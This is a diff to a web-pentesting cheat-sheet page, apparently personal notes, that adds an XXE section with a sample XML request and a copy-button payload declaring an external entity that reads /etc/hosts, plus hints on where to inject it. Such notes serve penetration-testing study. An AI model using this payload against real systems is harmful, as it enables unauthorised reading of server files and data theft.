@@ -36,12 +36,36 @@
 <b>NOTE: </b> Each time you found a site to upload files and the .xml extention is allowed, XXE attempts are needed. 
 	
 <details>
-<summary>COMMON VULNERABILITIES</summary>
+<summary>GENERAL INFORMATION</summary>
 
-<b>::: DISCOVERY: </b>
+1. Important to inspect the requests/responses, if XML code is present there's a chance to attempt XXE.
 
-</details>		
+</details>
+<details>
+<summary>EXTERNAL ENTITIES</summary>
+
+1. Traffic inspection is needed.
+
+<b><u>SAMPLE:</u></b>
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE attempt [ &lt;!ENTITY CUMBIA SYSTEM "file:///etc/hosts"&gt; ]&gt;
+&lt;Check&gt;
+&lt;Id&gt;&CUMBIA;&lt;/Id&gt;
+&lt;productId&gt;1&lt;/productId&gt;
+&lt;/Check&gt;
+
+<b>COMMON PAYLOAD:</b><mark id="XXE01"> <!DOCTYPE attempt [ <!ENTITY CUMBIA SYSTEM "file:///etc/hosts"> ]> </mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#XXE01')">.C1.</button>
 	
+<b>NOTE:</b> The name "CUMBIA" is the entity name used to call <u>/etc/hosts</u> externally, it is invoked into the XML file
+and call it using one input field. Special section to put the XML code, <u>between initial tag and function.</u> 
+Modify the name as your needs. 
+	
+</details>
+
+
 </div>
 </pre>
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'">GO BACK</button>
